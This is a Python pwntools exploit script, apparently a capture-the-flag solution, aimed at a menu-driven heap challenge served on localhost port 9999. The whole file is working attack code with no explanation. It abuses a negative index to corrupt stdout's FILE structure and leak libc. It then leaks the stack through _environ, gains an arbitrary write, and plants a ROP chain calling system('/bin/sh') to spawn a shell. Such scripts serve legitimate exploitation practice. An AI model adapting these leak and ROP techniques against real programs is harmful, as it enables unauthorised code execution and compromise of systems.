from pwn import *
context.log_level='debug'
context.os='linux'
context.arch='amd64'


def add(idx,size):
    p.sendlineafter(b'>> ',b'1')
    p.sendlineafter(b'Index: ',str(idx).encode())
    p.sendlineafter(b'Size: ',str(size).encode())

def delete(idx):
    p.sendlineafter(b'>> ',b'2')
    p.sendlineafter(b'Index: ',str(idx).encode())

def edit(idx,content):
    p.sendlineafter(b'>> ',b'3')
    p.sendlineafter(b'Index: ',str(idx).encode())
    p.sendafter(b'Content: ',content)

p=remote('127.0.0.1',9999)
libc=ELF('./libc.so.6')
add(8,0x10)
delete(8)
payload=p64(0xfbad1887)+p64(0)*3+b'\xe8\x47'
edit(-8,payload)
libcbase=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))-libc.symbols['_IO_2_1_stdin_']
print(hex(libcbase))
environ=libcbase+libc.symbols['_environ']
edit(-8,p64(0xfbad1887)+p64(0)*3+p64(environ)+p64(environ+8))
stack=u64(p.recvuntil(b'\x7f').ljust(8,b'\x00'))-0x140
print(hex(stack))
add(0xf,0x200)
add(-1,stack)
rdi=libcbase+0x2a3e5
binsh=libcbase+next(libc.search(b'/bin/sh\x00'))
system=libcbase+libc.symbols['system']
ret=libcbase+0x29139
payload=p64(ret)+p64(rdi)+p64(binsh)+p64(system)
edit(0xf,payload)
p.interactive()
